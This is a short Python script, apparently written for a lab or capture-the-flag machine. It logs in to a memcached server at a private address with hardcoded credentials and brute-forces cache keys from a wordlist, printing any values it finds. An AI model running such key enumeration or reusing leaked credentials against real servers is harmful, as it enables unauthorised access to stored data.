#!/usr/bin/python3

import bmemcached
import sys
from pwn import *

brutefile = sys.argv[1]
connect = bmemcached.Client('10.10.10.190:11211', 'felamos', 'zxcvbnm')
brutefile = open(brutefile).readlines()
for param in brutefile:
    param = param.strip()
    result = str(connect.get(param))
    if 'None' not in result:     
        print()
        log.info(f"Key -> {param}")
        log.success(result)
            
